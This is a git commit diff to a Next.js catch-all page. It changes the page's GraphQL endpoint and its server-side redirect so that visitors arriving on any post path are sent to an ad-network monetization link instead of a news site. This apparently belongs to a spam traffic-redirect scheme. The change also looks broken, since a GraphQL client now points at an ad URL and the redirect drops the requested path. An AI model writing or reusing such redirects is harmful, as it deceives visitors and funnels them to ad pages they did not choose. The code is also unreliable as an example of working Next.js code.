78979037e7ec0c85198a78e50bc182017edce4bc
UsaTime <160224255+Yanur888@users.noreply.github.com>
2024-02-16 05:05:18 -1000

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -4,7 +4,7 @@ import { GetServerSideProps } from 'next';
 import { GraphQLClient, gql } from 'graphql-request';
 
 export const getServerSideProps: GetServerSideProps = async (ctx) => {
-	const endpoint = " https://usalivenews.000webhostapp.com/graphql"
+	const endpoint = "https://www.profitablegatecpm.com/ydwgk6rg?key=3afd21cc79f1bfae0a7d7f24376bdafc"
 	const graphQLClient = new GraphQLClient(endpoint);
 	const referringURL = ctx.req.headers?.referer || null;
 	const pathArr = ctx.query.postpath as Array<string>;
@@ -18,7 +18,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					'https://usalivenews.000webhostapp.com/' + encodeURI(path as string)
+					'https://www.profitablegatecpm.com/ydwgk6rg?key=3afd21cc79f1bfae0a7d7f24376bdafc/' 
 				}`,
 			},
 		};
